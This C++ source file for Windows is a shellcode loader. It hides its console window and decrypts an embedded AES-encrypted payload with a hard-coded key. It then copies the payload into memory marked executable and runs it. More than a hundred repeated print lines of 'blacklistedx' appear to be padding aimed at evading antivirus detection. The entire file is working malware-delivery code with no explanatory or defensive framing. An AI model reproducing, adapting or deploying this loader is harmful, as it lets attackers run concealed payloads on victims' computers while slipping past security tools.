#include <cstring>
#include <iostream>
#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <wincrypt.h>

 void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

 
int main(int argc, char **argv) {
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	std::cout << "blacklistedx";
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char AESkey[] = { 0xa4, 0x1f, 0xe9, 0xa, 0xbb, 0x25, 0xed, 0x98, 0x9f, 0xfd, 0x17, 0xda, 0x48, 0x21, 0xde, 0xb9 };
	unsigned char payload[] = { 0x4d, 0x9d, 0xdb, 0xf4, 0x9d, 0xb4, 0xe7, 0x72, 0xd8, 0x5e, 0x27, 0x33, 0x37, 0x65, 0xa6, 0xf, 0x38, 0x1c, 0x26, 0x57, 0xa3, 0x55, 0xef, 0xb, 0x6d, 0x53, 0x4b, 0x46, 0x79, 0x52, 0xd4, 0x7b, 0x35, 0x1e, 0x9b, 0x68, 0xa7, 0x52, 0x9c, 0xb0, 0x4e, 0x52, 0x46, 0x8f, 0x6e, 0xf7, 0x37, 0x52, 0x20, 0xe6, 0xb6, 0x8a, 0xab, 0x41, 0xbd, 0xc1, 0xeb, 0x6, 0x4a, 0x50, 0xbc, 0x56, 0xda, 0x70, 0xf3, 0xdc, 0x17, 0x69, 0xae, 0xaa, 0xb9, 0x49, 0xbd, 0xff, 0xbc, 0xd4, 0x90, 0x7c, 0xf8, 0x37, 0x7d, 0x59, 0x57, 0x24, 0xa0, 0xe2, 0x33, 0xaf, 0xfc, 0x6b, 0x92, 0xf6, 0xc8, 0xd5, 0x93, 0xa4, 0xaa, 0x34, 0x9d, 0x17, 0x2d, 0xec, 0x69, 0x29, 0xb4, 0xa3, 0x41, 0x81, 0xfc, 0x3c, 0x8, 0xbd, 0xfe, 0x81, 0xd, 0xf8, 0xb7, 0x0, 0x6f, 0xd5, 0x6b, 0x8a, 0x4b, 0x44, 0x38, 0xce, 0x0, 0xc, 0x2d, 0xf3, 0xe, 0xb4, 0x25, 0x50, 0xc7, 0x75, 0x9d, 0xb2, 0x60, 0x52, 0x9a, 0x26, 0x3c, 0x5d, 0x86, 0xdb, 0x32, 0x10, 0x75, 0x4b, 0xae, 0xfc, 0xd5, 0x84, 0x79, 0x69, 0x6d, 0x2, 0x51, 0x53, 0x47, 0x89, 0xdb, 0xd3, 0x10, 0x1, 0x64, 0xc9, 0x41, 0x8c, 0x52, 0x72, 0x7d, 0xb, 0xf, 0x5f, 0xf0, 0xad, 0x46, 0x27, 0xb3, 0xd2, 0xfc, 0x3f, 0xe4, 0xef, 0xac, 0x52, 0xd3, 0xcb, 0xb9, 0xd4, 0xc, 0x26, 0x97, 0x6b, 0x99, 0xe1, 0x21, 0x13, 0xcb, 0x2c, 0x28, 0x71, 0xc8, 0xa1, 0x38, 0xc, 0x3d, 0x3, 0x51, 0x61, 0x93, 0x9d, 0x6e, 0xe2, 0xdf, 0xc7, 0xa8, 0x27, 0x4a, 0x78, 0x62, 0x5b, 0x1, 0xb9, 0x26, 0xe3, 0x68, 0x5d, 0x61, 0xf1, 0x12, 0xb3, 0x11, 0xf7, 0xf7, 0xd1, 0xc0, 0x14, 0xc9, 0x23, 0xa3, 0xdd, 0xbf, 0xec, 0xfd, 0x8d, 0x9b, 0xc9, 0x51, 0xc3, 0x4f, 0x6b, 0xb2, 0x42, 0x9b, 0x99, 0x37, 0x11, 0x4f, 0x11, 0x9c, 0x50, 0x45, 0x6e, 0xa2, 0x23, 0x84, 0x87, 0x72, 0x2e, 0x71, 0xe9, 0xc8, 0xcc, 0x63, 0x79, 0xd7, 0xd5, 0xf5, 0x34, 0xc9, 0xc, 0x8c, 0x1, 0xa9, 0xa5, 0x3f, 0x25, 0xc, 0x5e, 0x3e, 0xa6, 0xbf, 0xfe, 0x39, 0xea, 0x94, 0xb2, 0xfd, 0x5f, 0x4, 0x54, 0x6c, 0xdf, 0x5b, 0x53, 0xf6, 0x74, 0xca, 0xb1, 0xac, 0x81, 0x9, 0x9d, 0x22, 0xba, 0x6d, 0x36, 0x80, 0xb6, 0xf, 0x37, 0xab, 0x5, 0x98, 0x6c, 0xd6, 0x6, 0xc7, 0x1c, 0xf1, 0xb5, 0x2, 0x3f, 0x6a, 0x3a, 0xcb, 0x75, 0xe, 0xad, 0x33, 0x12, 0x54, 0xb2, 0xfe, 0x98, 0x1e, 0x2, 0x9e, 0xba, 0xe, 0xa5, 0x71, 0xab, 0xbf, 0x1d, 0x2f, 0x52, 0xcd, 0xb0, 0x5f, 0xc7, 0x9a, 0x97, 0x3e, 0x7f, 0x63, 0x9f, 0xf2, 0xb1, 0x7d, 0xf5, 0xdc, 0x6a, 0x51, 0x73, 0xb8, 0xf7, 0xef, 0x6f, 0x4c, 0xf0, 0x8e, 0x36, 0xbb, 0x20, 0xf4, 0x98, 0x8f, 0x74, 0x74, 0x61, 0xf6, 0x29, 0x6, 0x98, 0x12, 0xc, 0xb3, 0x3d, 0x26, 0xa2, 0x35, 0xbe, 0x5a, 0x3a, 0x95, 0xc4, 0x5, 0x41, 0x9d, 0xdf, 0x9f, 0x66, 0x24, 0x37, 0xb7, 0x4c, 0xcb, 0xcc, 0xa8, 0xd1, 0xc, 0xd6, 0x8c, 0x8d, 0x64, 0xd9, 0xbd, 0xb5, 0xee, 0x1e, 0xc8, 0x70, 0x39, 0x71, 0x48, 0x5d, 0x45, 0x40, 0x19, 0x40, 0xeb, 0x60, 0x87, 0x74, 0xa, 0x8, 0xd0, 0x2b, 0x84, 0x8a, 0x60, 0x90, 0x6d, 0x79, 0x87, 0xbc, 0x1, 0x14, 0x42, 0x69 };
	DWORD payload_length = sizeof(payload);
PVOID BaseAddress = NULL;
    SIZE_T dwSize = 0x2000;

    // Decrypt the AES payload to Original Shellcode
     DecryptAES((char*)payload, payload_length, AESkey, sizeof(AESkey));
	void *exec = VirtualAlloc(0, sizeof payload, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, payload, sizeof payload);
	((void(*)())exec)();		
}
